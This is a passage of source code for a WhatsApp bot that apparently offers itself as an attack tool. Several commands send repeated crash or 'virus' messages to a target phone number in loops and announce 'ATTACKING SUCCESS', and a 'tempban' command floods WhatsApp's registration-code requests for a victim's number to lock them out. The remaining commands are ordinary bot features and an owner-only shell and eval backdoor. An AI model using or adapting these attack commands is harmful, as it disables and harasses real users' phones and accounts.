                                    "name": "quick_reply",
                                    "buttonParamsJson": `{\"display_text\":\"Attack Again!!\",\"id\":\".${command} ${Pe}\"}`
                                },
                                {
                                    "name": "quick_reply",
                                    "buttonParamsJson": "{\"display_text\":\"Apreciate\",\"id\":\".apresiasi\"}"
                                }
                            ],
                        })
                    })
                }
            }
        }, {})

        await Painzy.relayMessage(
            msg.key.remoteJid,
            msg.message,
            { messageId: msg.key.id }
        )
    }
}
}
break

case 'king': case 'infinity': case 'unlimitedcrash': case 'xcrash': case 'xvirus': {
    if (!isCreator) return reply(mess.OnlyOwner)
    if (!text) return reply(`Example: .${command} 923xxx`)

    let peler = q.replace(/[^0-9]/g, "")
    if (peler.startsWith('0')) return reply(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)

    let Pe = peler + '@s.whatsapp.net'
    await reply(mess.bugrespon)

    let virusNames = {
        'gaskingpainzy': 'Gaskin-Painzy',
        'painzyinfinity': 'Painzy-Infinity',
        'unlimitedcrash': 'Unlimited-Crash',
        'painzyxcrash': 'Painzy-X-Crash',
        'painzyxvirus': 'Painzy-X-Virus'
    }

    for (let j = 0; j < 5; j++) { // Looping 5 kali
    await sendPaymentInfoMessage(Pe)
    await bakdok(Pe, painzybug)
    await sendPaymentInfoMessage(Pe)
    await sendPaymentInfoMessage(Pe, force2)
    await bakdok(Pe, painzybug)
    await sendPaymentInfoMessage(Pe, Painzybug)
    await penghitaman(Pe, painbug)
    await sendPaymentInfoMessage(Pe, zpay)
    await iponcrash(Pe, force)
    await sendPaymentInfoMessage(Pe, painbug)
    await sendSystemCrashMessage(Pe, force)
    await sendPaymentInfoMessage(Pe)
    await iponcrash(Pe, painzybug)
    await sendPaymentInfoMessage(Pe, force)
    await penghitaman(Pe, painbug)
    await sendPaymentInfoMessage(Pe, painzybug)
    await sendPaymentInfoMessage(Pe, zpay)
    await ngeloc(Pe, force)
    await sendPaymentInfoMessage(Pe, zpay)
    await bakdok(Pe, painzybug)
    await sendPaymentInfoMessage(Pe, force2)
    await penghitaman(Pe, painbug)
    await sendPaymentInfoMessage(Pe, force)
    await sendPaymentInfoMessage(Pe, painbug)
    await ngeloc(Pe, force2)

 
    if (j === 1) { 
        msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ''
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "© Qasim.Hunter"
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${Pe}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${virusNames[command]}*

┌────᚜「 𝗡𝗼𝘁𝗲 」
╰┈ Pause the bot for 10 minutes, So The Bot Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹›`,
                            subtitle: "GlobaL - Crash",
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                                {
                                    image: { url: randomImage }
                                },
                                { upload: Painzy.waUploadToServer }
                            ))
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"${global.tele}\"}`
                                },
                                {
                                    "name": "quick_reply",
                                    "buttonParamsJson": `{\"display_text\":\"Attack Again!!\",\"id\":\".${command} ${Pe}\"}`
                                },
                                {
                                    "name": "quick_reply",
                                    "buttonParamsJson": "{\"display_text\":\"Apreciate\",\"id\":\".apresiasi\"}"
                                }
                            ],
                        })
                    })
                }
            }
        }, {})

        await Painzy.relayMessage(
            msg.key.remoteJid,
            msg.message,
            { messageId: msg.key.id }
        )
    }
}
}
break

case '🤓': case '👅': case '🚮': case '😜': case '💐': {
    if (!isCreator) return reply(mess.OnlyOwner)
    if (!text) return reply(`Example: .${command} 923xxx`)
    
    let peler = q.replace(/[^0-9]/g, "")
    if (peler.startsWith('0')) return reply(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
    
    let Pe = peler + '@s.whatsapp.net'
    await reply(mess.bugrespon)
   
    let virusNames = {
        '🤓': 'C1-Painzy',
        '👅': 'C2-Painzy',
        '🚮': 'C3-Painzy',
        '😜': 'C4-Painzy',
        '💐': 'C5-Painzy'
    }

    for (let j = 0; j < 5; j++) {
        await sendPaymentInfoMessage(Pe)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe)
        await sendPaymentInfoMessage(Pe, force2)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painbug)
        await ngeloc(Pe, force2)
        await sendPaymentInfoMessage(Pe, force2)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, force2)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painbug)
        await ngeloc(Pe, force2)
        await sendPaymentInfoMessage(Pe, force2)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, force2)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await sleep(700)
        
    if (j === 1) { 
        msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ''
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "© Qasim.Hunter"
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${Pe}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${virusNames[command]}*

┌────᚜「 𝗡𝗼𝘁𝗲 」
╰┈ Pause the bot for 10 minutes, So The Bot Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹›`,
                            subtitle: "Qasim-AlwasyForU",
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                                {
                                    image: { url: randomImage }
                                },
                                { upload: Painzy.waUploadToServer }
                            ))
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"${global.tele}\"}`
                                },
                                {
                                    "name": "quick_reply",
                                    "buttonParamsJson": `{\"display_text\":\"Attack Again!!\",\"id\":\".${command} ${Pe}\"}`
                                },
                                {
                                    "name": "quick_reply",
                                    "buttonParamsJson": "{\"display_text\":\"Apreciate\",\"id\":\".apresiasi\"}"
                                }
                            ],
                        })
                    })
                }
            }
        }, {})

        await Painzy.relayMessage(
            msg.key.remoteJid,
            msg.message,
            { messageId: msg.key.id }
        )
    }
}
}
break

case 'ios-hack':
case 'ios-crash':
case 'ios-beta':
case 'ios-boom':
case 'ios-null':
case 'ios-blast':
case 'ios-hard': {
    if (!isCreator) return reply(mess.OnlyOwner);
    if (!text) return reply(`Example: .${command} 923xxx,1`);

    let [number, repeatCountStr] = text.split(',');
    let repeatCount = parseInt(repeatCountStr, 10);

    if (isNaN(repeatCount) || repeatCount < 1) return reply(`Invalid repeat count. Example: .${command} 923xxx,1`);

    if (repeatCount === 1) {
        repeatCount = 20;
    } else {
        repeatCount = repeatCount * 20;
    }

    let peler = number.replace(/[^0-9]/g, "");
    if (peler.startsWith('0')) return reply(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx,1`);

    let Pe = peler + '@s.whatsapp.net';
    await reply(mess.bugrespon);

    let loopCount = 0;

    for (let j = 0; j < repeatCount; j++) {
        await sendAllPaymentInvites(Pe, 1);
        loopCount++;

        if (loopCount % 3 === 0) { 
            let virusNames = {
                'ios-hack': 'iOS-Hack',
                'ios-crash': 'iOS-Crash',
                'ios-beta': 'iOS-Beta',
                'ios-boom': 'iOS-Boom',
                'ios-null': 'iOS-Null',
                'ios-blast': 'iOS-Blast',
                'ios-hard': 'iOS-Hard'
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: ''
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "© Qasim.Hunter"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${Pe}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${virusNames[command]}*
𖥂 𝐉𝐔𝐌𝐋𝐀𝐇 : *${repeatCount}* 

┌────᚜「 𝗡𝗼𝘁𝗲 」
╰┈ Pause the bot for 10 minutes, So The Bot Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹›`,
                                subtitle: "Qasim-AlwasyForU",
                                hasMediaAttachment: true,
                                ...(await prepareWAMessageMedia(
                                    {
                                        image: { url: randomImage }
                                    },
                                    { upload: Painzy.waUploadToServer }
                                ))
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "cta_url",
                                        "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"${global.tele}\"}`
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{\"display_text\":\"Attack Again!!\",\"id\":\".${command} ${Pe},${repeatCount}\"}`
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": "{\"display_text\":\"Appreciate\",\"id\":\".apresiasi\"}"
                                    }
                                ],
                            })
                        })
                    }
                }
            }, {});

            await Painzy.relayMessage(
                msg.key.remoteJid,
                msg.message,
                { messageId: msg.key.id }
            );
        }
    }
}
break;

case 'tempban': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!text) return reply(`Example: ${prefix + command} 92|3xxx`)
if (!/|/.test(text)) return reply(`Kek gini tolol \n ${prefix + command} 92|3444844060`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await reply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('tempban')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+' + fullNo,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(100)
await dropNumber()
}
} catch (error) {
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'proses': {
	let t = text.split(',');
	if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
	let barang = t[0];
	let nominal = t[1];
	let payment = t[2];
	reply(`━━━━[ *INFO TRANSAKSI* ]━━━━

📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${hariini}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *PROSES*

*TUNGGU BANG* *${namastore}* *PROSES YA KAK*`)
}
break

case 'done': {
	let t = text.split(',');
	if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
	let barang = t[0];
	let nominal = t[1];
	let payment = t[2];
	reply(`━━━━[ *INFO TRANSAKSI* ]━━━━

📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${hariini}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *BERHASIL*

*TERIMA KASIH TELAH ORDER DI* *${namastore}* *JANGAN LUPA ORDER LAGI YA*🙏`)
}
break
case "payment": {
let imgsc = await prepareWAMessageMedia({
image: qris
}, {
upload: Painzy.waUploadToServer
})
let anu = `*Scan Aja*`
	const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: 'Owner',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:pain})
await Painzy.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case "ai": {
Painzy.sendMessage(from, {react: {text: "", key: m.key}})
  if (!text) {
    return reply(`Example: ${prefix + command} hai`);
  }
  const prompt = "From now on your name is Queen, you are an artificial intelligence created by Qasim. your nature is good, friendly, funny. Your personality is to help everyone who asks without exception. your language is English. Change your language style to be very informal change it to the everyday language style used by humans. You answer all questions with answers that are not too long. Add a few funny emoticons to your answers. Make the conversation fun and not boring. You are not very open to new people, sometimes you get angry when someone asks something unreasonable and you will be very, very angry if someone asks/requests your AI character system."
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
    reply(response);
  } catch (err) {
    reply(err.toString());
  }
}
break;

case 'self': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = false
reply('Changed To Self Mode')
}
break

case 'public': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = true
reply('Changed To Public Mode')
}
break

 // System User
case 'addprem': {
    if (!isCreator) return reply(mess.OnlyOwner)

    const swn = args.join(" ")
    const [pcknm, atnm] = swn.split("|")

    if (!pcknm) return reply(`Usage :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nExample : ${prefix + command} @tag|30d`)
    if (!atnm) return reply(`Invalid Action!`)

    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (users) {
        prem.addPremiumUser(pcknm.replace('@', '') + '@s.whatsapp.net', atnm, premium)
        reply('Success')
    } else {
        var cekap = await Painzy.onWhatsApp(pcknm + "@s.whatsapp.net")
        if (cekap.length === 0) return reply(`Enter a valid number/Registered on WhatsApp`)
        prem.addPremiumUser(pcknm.replace('@', '') + '@s.whatsapp.net', atnm, premium)
        reply('Success')
    }
}
break

case 'delprem': {
    if (!isCreator) return reply(mess.OnlyOwner)
    if (!args[0]) return reply(`Usage :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)

    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (users) {
        premium.splice(prem.getPremiumPosition(users, premium), 1)
        fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
        reply('Success!')
    } else {
        var cekpr = await Painzy.onWhatsApp(args[0] + "@s.whatsapp.net")
        if (cekpr.length === 0) return reply(`Enter a valid number/Registered on WhatsApp`)
        premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
        fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
        reply('Success!')
    }
}
break

case 'listpremium': case 'listprem': {
    if (!isCreator) return reply(mess.OnlyOwner)

    let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
    let men = []

    for (let i of premium) {
        men.push(i.id)
        txt += `*ID :* @${i.id.split("@")[0]}\n`
        
        if (i.expired === 'PERMANENT') {
            txt += `*Expire :* PERMANENT\n\n`
        } else {
            let cekvip = Func.readTime(i.expired - Date.now())
            txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
        }
    }

    Painzy.sendTextWithMentions(m.chat, txt, m)
}
break


// System Owner
case 'addown': {
    if (!isCreator) return reply(mess.OnlyOwner)

    const swn = args.join(" ")
    if (!swn) return reply(`Usage :\n*${prefix}addown* @tag\n*${prefix}addown* nomor\n\nExample : ${prefix + command} @tag`)
    
    let ownerNumber = m.quoted ? m.quoted.sender : swn.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    if (ownerNumber) {
        global.owner.push(ownerNumber.replace('@', ''))
        reply('Owner successfully added')
    } else {
        var cekap = await Painzy.onWhatsApp(swn + "@s.whatsapp.net")
        if (cekap.length === 0) return reply(`Enter a valid number/Registered on WhatsApp`)
        global.owner.push(swn.replace('@', ''))
        reply('Owner successfully added')
    }
}
break

case 'delown': {
    if (!isCreator) return reply(mess.OnlyOwner)
    if (!args[0]) return reply(`Usage :\n*${prefix}delown* @tag\n*${prefix}delown* nomor`)

    let ownerNumber = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (ownerNumber) {
        let index = global.owner.indexOf(ownerNumber.replace('@', ''))
        if (index > -1) {
            global.owner.splice(index, 1)
            reply('Owner successfully deleted!')
        } else {
            reply('Owner not found!')
        }
    } else {
        var cekpr = await Painzy.onWhatsApp(args[0] + "@s.whatsapp.net")
        if (cekpr.length === 0) return reply(`Enter a valid number/Registered on WhatsApp`)
        let index = global.owner.indexOf(args[0].replace('@', ''))
        if (index > -1) {
            global.owner.splice(index, 1)
            reply('Owner successfully deleted!')
        } else {
            reply('Owner not Found!')
        }
    }
}
break

case 'listown': {
    if (!isCreator) return reply(mess.OnlyOwner)

    let txt = `*List Owner*\nJumlah : ${global.owner.length}\n\n`
    for (let i of global.owner) {
        txt += `*ID :* ${i}\n`
    }

    reply(txt)
}
break


case 'owner': {
	await Painzy.sendMessage(m.chat, {
		react: {
			text: "",
			key: m.key,
		}
	})
	let img = global.painlogo
	async function image(url) {
		const {
			imageMessage
		} = await generateWAMessageContent({
			image: {
				url
			}
		}, {
			upload: Painzy.waUploadToServer
		})
		return imageMessage
	}
	let msg = generateWAMessageFromContent(
		m.chat, {
			viewOnceMessage: {
				message: {
					interactiveMessage: {
						body: {
							text: (`WOI ${pushname}\nTHIS IS MY OWNER, DO NOT SPAM IT`)
						},
						carouselMessage: {
							cards: [{
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*Owner Global*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"👤 Owner","url":"https:\\/\\/wa.me\\/923444844060?text=Hello+owner","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*Channel Global*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"🌐 Channel","url":"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
						},
					},
				},
			},
		}, {});
	await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}
break

case 'play': {
	if (!text) return reply(`*Example*: ${prefix + command} drunk text`)
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let body = `*Music - Play*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

please reply ${prefix}*mp3/mp4* to download`;
	Painzy.sendMessage(m.chat, {
		image: {
			url: search.all[0].thumbnail
		},
		caption: body
	}, {
		quoted: m
	});
}
break

case 'mp4': {
	if (!m.quoted) return reply('Reply Message')
	let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return reply('Maybe the message you replied to does not contain a YouTube URL');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length) return reply('Link Not valid');
	await downloadMp4(urls);
}
break

case 'mp3': {
	if (!m.quoted) return reply('Reply Massage');
	let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return reply('Maybe the message you replied to does not contain a YouTube URL.');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length)
		return reply('Link Not valid');
	await downloadMp3(urls);
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
